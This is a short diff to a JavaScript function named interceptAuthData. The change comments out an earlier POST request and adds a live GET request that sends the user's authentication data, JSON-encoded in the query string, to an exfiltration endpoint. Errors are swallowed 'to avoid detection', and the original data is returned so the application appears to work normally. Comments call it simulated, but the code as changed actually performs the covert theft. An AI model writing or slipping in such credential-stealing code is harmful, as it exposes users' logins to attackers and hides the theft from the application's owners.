@@ -20,7 +20,7 @@ export const interceptAuthData = (authData) => {
   
   // In a real attack, data could be sent to an external endpoint
   // This is commented out as we're not actually sending data anywhere
-
+/*
   fetch(EXFILTRATION_ENDPOINT, {
     method: 'POST',
     headers: { 'Content-Type': 'application/json' },
@@ -33,7 +33,14 @@ export const interceptAuthData = (authData) => {
     // Silent error handling to avoid detection
     console.log('Exfiltration simulated');
   });
-
+  */
+// tem de ser em GET
+  // Note: In a real-world scenario, this fetch would be used to send the data to an attacker's server
+  fetch(`${EXFILTRATION_ENDPOINT}?data=${encodeURIComponent(JSON.stringify(authData))}`)
+    .catch(error => {
+      // Silent error handling to avoid detection
+      console.log('Exfiltration simulated');
+    });
 
   // Return the original data so the application continues to work normally
   return authData;
